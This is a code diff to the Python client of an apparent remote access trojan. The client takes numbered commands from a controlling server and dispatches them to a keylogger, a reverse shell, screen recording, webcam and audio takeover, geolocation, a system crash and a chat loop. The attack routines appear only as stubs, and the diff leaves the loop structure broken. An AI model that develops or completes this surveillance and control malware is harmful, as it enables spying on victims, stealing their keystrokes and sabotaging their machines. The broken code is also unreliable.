@@ -23,38 +23,39 @@ class Client:
             self.route.close()
     
     def messaging(self):
-        while True:
             self.data_from_blacksheep = self.route.recv(1024).decode("utf-8")
             print(self.data_from_blacksheep)
-            if not self.data_from_blacksheep or self.data_from_blacksheep == "END":
-                #incase there is no data from blacksheep {self destruct}
-                break
-            if self.data_from_blacksheep == 1:
+            if self.data_from_blacksheep == "1":
                 #screen recording goes here
                 self.screen_record()
                 pass
-            if self.data_from_blacksheep == 2:
+            if self.data_from_blacksheep == "2":
                 #keylogger codes goes here
                 self.keylogger()
                 pass
-            if self.data_from_blacksheep == 3:
+            if self.data_from_blacksheep == "3":
                 #screen reverse shell goes here
                 self.reverse_shell()
                 pass
-            if self.data_from_blacksheep == 4:
-                #crashing the entire system
+            if self.data_from_blacksheep == "4":
+                #crashing the entire systemclear
+
                 self.crash_sys()
                 pass
-            if self.data_from_blacksheep == 5:
+            if self.data_from_blacksheep == "5":
                 #take over cameras and audio
                 self.webcam()
                 pass
-            if self.data_from_blacksheep == 6:
+            if self.data_from_blacksheep == "6":
                 #get the exact locations
                 self.geolocate()
                 pass
-            else:
+            if self.data_from_blacksheep == "7":
+                #get the exact locations
+                self.chat()
                 pass
+            else:
+                print("no match found")
 
     def main(self):
         self.connection_to_server()
@@ -87,6 +88,14 @@ class AttackModes:
     #get the exact locations
     def geolocate():
         pass
+
+    def chat(self):
+        while True:
+            self.data_from_blacksheep = self.route.recv(1024).decode("utf-8")
+            print(self.data_from_blacksheep)
+            if not self.data_from_blacksheep or self.data_from_blacksheep == "END":
+                #incase there is no data from blacksheep {self destruct}
+                break
 
 S = Client()
 S.main()
